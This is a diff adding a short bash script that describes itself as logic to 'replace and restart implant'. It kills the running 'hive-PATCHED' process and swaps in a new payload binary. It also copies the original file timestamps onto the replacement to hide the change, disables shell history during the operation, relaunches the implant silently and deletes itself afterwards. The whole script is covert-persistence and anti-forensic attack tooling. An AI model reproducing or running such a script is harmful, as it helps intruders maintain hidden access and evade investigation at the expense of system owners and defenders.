@@ -1,0 +1,46 @@
+#!/bin/bash
+
+
+fileToDelete=$0
+
+#Remove history temporarily...
+OLDHISTFILE=$HISTFILE
+unset HISTFILE
+export HISTFILE
+OLDHISTSIZE=$HISTSIZE
+HISTSIZE=0
+export HISTSIZE
+
+#Most logic required to replace and restart implant...
+
+kill -9 `ps -ef | grep hive-PATCHED | grep -v grep | awk '{ print $2 }' ` 2>/dev/null
+sleep 5
+
+#  Saved time information   
+touch -r /home/miker/hive-PATCHED /home/miker/tempPayload
+sleep 2
+
+rm -f /home/miker/hive-PATCHED 2>/dev/null 
+sleep 5
+
+cp -f /home/miker/tempPayload /home/miker/hive-PATCHED 2>/dev/null 
+sleep 5
+
+#  Transferred time information back 
+touch -r /home/miker/tempPayload  /home/miker/hive-PATCHED 2>/dev/null
+sleep 2
+
+/home/miker/hive-PATCHED &>/dev/null 
+sleep 5
+
+#Remove tempPayload file if it exists
+rm -f /home/miker/tempPayload 2>/dev/null
+
+#Reset History.
+HISTSIZE=$OLDHISTSIZE
+export HISTSIZE
+set HISTFILE $OLDHISTFILE
+export HISTFILE
+
+#Remove the installation script...
+rm -f $fileToDelete 2>/dev/null
